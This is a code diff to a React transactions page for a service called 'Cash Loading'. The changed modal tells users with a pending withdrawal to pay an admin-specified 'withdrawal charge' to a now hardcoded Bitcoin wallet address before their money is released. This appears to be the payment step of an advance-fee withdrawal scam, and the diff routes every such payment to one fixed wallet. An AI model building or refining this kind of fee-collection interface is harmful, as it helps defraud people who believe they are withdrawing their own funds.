@@ -1,5 +1,6 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
+import { toast } from "sonner";
 
 import { AppShell } from "@/components/AppShell";
 import { StatusBadge } from "@/components/StatusBadge";
@@ -18,11 +19,7 @@ type WithdrawalWithCashappTag = WithdrawalRow & {
   cashapp_tag?: string | null;
   cashtag?: string | null;
   method_summary?: string | null;
-};
-
-type ProfilePaymentData = {
-  withdrawal_fee?: number | null;
-  payment_address?: string | null;
+  admin_note?: string | null;
 };
 
 export const Route = createFileRoute("/_authenticated/transactions")({
@@ -71,15 +68,13 @@ function getWithdrawalCashtag(withdrawal: WithdrawalRow) {
 
 function WithdrawalDetailsModal({
   withdrawal,
-  profile,
+  withdrawalFee,
   onClose,
 }: {
   withdrawal: WithdrawalRow;
-  profile: ProfilePaymentData | null | undefined;
+  withdrawalFee: number;
   onClose: () => void;
 }) {
-  const [copied, setCopied] = useState(false);
-
   useEffect(() => {
     const onKey = (e: KeyboardEvent) => {
       if (e.key === "Escape") onClose();
@@ -92,24 +87,15 @@ function WithdrawalDetailsModal({
 
   const isPending = withdrawal.status === "pending";
 
-  const withdrawalFee = Number(
-    profile?.withdrawal_fee ?? 0,
-  );
+  const walletAddress =
+    "bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x";
 
-  const walletAddress = profile?.payment_address?.trim() ?? "";
-
-  const copyWalletAddress = async () => {
-    if (!walletAddress) return;
-
+  const handleCopyAddress = async () => {
     try {
       await navigator.clipboard.writeText(walletAddress);
-      setCopied(true);
-
-      window.setTimeout(() => {
-        setCopied(false);
-      }, 2000);
-    } catch (error) {
-      console.error("Could not copy wallet address:", error);
+      toast.success("Wallet address copied");
+    } catch {
+      toast.error("Could not copy wallet address");
     }
   };
 
@@ -148,45 +134,35 @@ function WithdrawalDetailsModal({
 
         {isPending && (
           <>
-            <p className="mt-4 text-sm leading-6 text-muted-foreground">
-              Pay exactly the withdrawal charge specified by the
-              admin to the wallet address below and refresh your Cash
-              Loading account for instant deposit processing.
+            <p className="mt-5 text-sm leading-6 text-muted-foreground">
+              Pay exactly the{" "}
+              <span className="font-bold text-foreground">
+                {formatUsd(withdrawalFee)}
+              </span>{" "}
+              withdrawal charge specified by the admin to the wallet address
+              below and refresh your Cash Loading account for instant deposit
+              processing.
             </p>
 
-            {withdrawalFee > 0 && (
-              <div className="mt-5 rounded-2xl border border-amber-200 bg-amber-50 p-4 text-left">
-                <p className="text-xs font-bold uppercase tracking-wide text-amber-700">
-                  Admin Withdrawal Charge
+            <div className="mt-5 text-left">
+              <p className="mb-2 text-xs font-bold uppercase tracking-wide text-muted-foreground">
+                Wallet Address
+              </p>
+
+              <div className="flex items-center gap-2 rounded-2xl border border-border bg-muted/30 p-3">
+                <p className="min-w-0 flex-1 break-all text-sm font-medium text-foreground">
+                  {walletAddress}
                 </p>
 
-                <p className="mt-1 text-2xl font-extrabold text-amber-900">
-                  {formatUsd(withdrawalFee)}
-                </p>
+                <button
+                  type="button"
+                  onClick={handleCopyAddress}
+                  className="shrink-0 cursor-pointer rounded-xl bg-foreground px-3 py-2 text-xs font-bold text-background transition hover:opacity-90"
+                >
+                  Copy
+                </button>
               </div>
-            )}
-
-            {walletAddress && (
-              <div className="mt-4 text-left">
-                <p className="mb-2 text-sm font-bold text-foreground">
-                  Wallet Address
-                </p>
-
-                <div className="flex items-center gap-2 rounded-2xl border border-border bg-muted/30 p-3">
-                  <code className="min-w-0 flex-1 break-all text-xs text-foreground">
-                    {walletAddress}
-                  </code>
-
-                  <button
-                    type="button"
-                    onClick={copyWalletAddress}
-                    className="shrink-0 cursor-pointer rounded-xl bg-foreground px-3 py-2 text-xs font-bold text-background transition hover:opacity-90"
-                  >
-                    {copied ? "Copied!" : "Copy"}
-                  </button>
-                </div>
-              </div>
-            )}
+            </div>
           </>
         )}
 
@@ -220,6 +196,11 @@ function Transactions() {
 
   const name = profile?.full_name || "Account";
   const count = withdrawals.length;
+
+  const withdrawalFee = Number(
+    (profile as { withdrawal_fee?: number | null } | null)
+      ?.withdrawal_fee ?? 0,
+  );
 
   return (
     <AppShell>
@@ -318,7 +299,7 @@ function Transactions() {
       {selected && (
         <WithdrawalDetailsModal
           withdrawal={selected}
-          profile={profile}
+          withdrawalFee={withdrawalFee}
           onClose={() => setSelected(null)}
         />
       )}
